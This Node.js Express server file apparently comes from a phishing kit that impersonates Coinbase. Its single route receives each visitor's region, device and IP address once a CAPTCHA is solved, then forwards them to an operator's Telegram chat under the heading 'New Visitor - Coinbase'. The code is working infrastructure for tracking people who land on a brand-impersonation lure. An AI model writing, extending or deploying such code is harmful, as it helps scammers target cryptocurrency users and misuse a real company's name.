const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// POST /captcha-success
// Frontend calls this when CAPTCHA is solved
// Backend sends to Telegram
// ============================================================================

app.post("/captcha-success", async (req, res) => {
  try {
    const { region, device, ip } = req.body;

    if (!region || !device || !ip) {
      return res.status(400).json({ error: "Missing region, device, or ip" });
    }

    console.log(`\n✅ CAPTCHA SUCCESS RECEIVED`);
    console.log(`   Region: ${region}`);
    console.log(`   Device: ${device}`);
    console.log(`   IP: ${ip}`);

    // Build message
    const message = `❗️<b>New Visitor - Coinbase</b>❗️\n` +
      `\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    // Send to Telegram using bot token from env
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in environment");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      console.log("✅ Message sent to Telegram");
      res.json({ ok: true, message: "CAPTCHA processed" });
    } else {
      console.error("❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// Start server
// ============================================================================

app.listen(PORT, () => {
  console.log(`\n✅ Server running on port ${PORT}`);
  console.log(`📍 URL: ${process.env.APP_URL || `http://localhost:${PORT}`}`);
  console.log(`\n📡 Listening for CAPTCHA submissions...\n`);
});
